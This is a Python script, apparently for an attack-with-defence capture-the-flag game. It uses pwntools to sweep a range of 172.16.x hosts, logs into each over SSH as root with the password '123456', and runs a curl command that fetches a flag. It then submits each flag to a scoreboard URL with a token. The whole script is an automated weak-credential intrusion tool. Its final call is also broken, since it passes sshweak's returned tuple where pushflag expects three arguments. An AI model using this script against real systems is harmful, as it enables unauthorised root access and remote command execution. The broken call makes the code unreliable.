from pwn import *
import requests
ips = []
ipa = "172.16."
ipe1 = ".20"
ipe2 = ".30"

for i in range(101,128):
    if i == 103:
        continue
    ip1 = ipa + str(i) + ipe1
    ips.append(ip1)
    ip2 = ipa + str(i) + ipe2
    ips.append(ip2)

def sshweak(ip):
    try:
        s = ssh(host=ip, user="root", password="123456",port=22)
        io = s.run("/bin/bash -c 'curl http://10.10.10.10/getFlag'")
        flag = io.recvline().decode("utf-8")
    except:
        flag = ""
    return ip,flag

def pushflag(token,ip,flag):
    requests.get("http://10.10.10.10/awd/flag?token=" + token + "&ip=" + ip + "&flag=" + flag)

def main():
    for ip in ips:
        # print(ip)
        pushflag("1234567890987654321",sshweak(ip))

if __name__ == '__main__':
    main()
